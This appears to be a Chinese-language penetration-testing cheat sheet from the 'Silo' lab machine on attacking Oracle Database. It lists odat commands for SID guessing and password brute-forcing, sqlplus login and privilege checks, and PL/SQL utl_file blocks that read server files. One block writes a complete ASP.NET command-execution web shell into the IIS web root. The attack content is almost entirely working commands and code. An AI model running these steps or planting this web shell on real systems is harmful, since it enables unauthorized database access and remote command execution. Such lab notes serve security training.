
>[!info] 
>這篇的資料來源是Silo靶機
## odat
>[!warning ] 小節重點
>odat是針對Oracle Database的攻擊工具 

[吉哈伯連結](https://github.com/quentinhardy/odat?source=post_page-----65a330773117--------------------------------)
### 列舉sid
```
./odat.py sidguesser -s 10.10.10.82 -p 1521
```
### 密碼爆破
```
./odat.py passwordguesser -s 10.10.10.82 -p 1521 -d XE
```
## Sql指令
- 透過sqlplus連線
```
sqlplus scott@10.10.10.82
```
- 透過sqlplus連線(sysdba)
```
sqlplus scott@10.10.10.82 as sysdba
```
- 檢查帳號權限
```
select * from session_privs;
```
- 開啟serveroutput
```
set serveroutput on
```
## 讀取、寫入檔案 
>[!warning ] 小節重點
>因為Oracle的限制，寫入最多100字，所以寫入之前要先檢查，最好是把空格、css、style、comment拿掉
- 去除空白指令
```
sed -z 's/\n//g' cmdasp.aspx
```
- 計算字數指令
```
sed -z 's/\n//g' cmdasp.aspx | wc -c
```
### 讀取檔案
```
declare  
f utl_file.file_type;  
s varchar(200);  
begin  
f := utl_file.fopen('/inetpub/wwwroot', 'iisstart.htm', 'R');  
utl_file.get_line(f,s);  
utl_file.fclose(f);  
dbms_output.put_line(s);  
end;  
/
```
### 寫入檔案 
```
declare  
f utl_file.file_type;  
s varchar(5000) := '<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c "+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write("<pre>");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("</pre>");}</script><body ><form id="cmd" method="post" runat="server"><asp:TextBox id="txtArg" runat="server" Width="250px"></asp:TextBox><asp:Button id="testing" runat="server" Text="execute" OnClick="cmdExe_Click"></asp:Button><asp:Label id="lblText" runat="server">Command:</asp:Label></form></body>';  
begin  
f := utl_file.fopen('/inetpub/wwwroot', 'web.aspx', 'W');  
utl_file.put_line(f,s);  
utl_file.fclose(f);  
end;  
/
```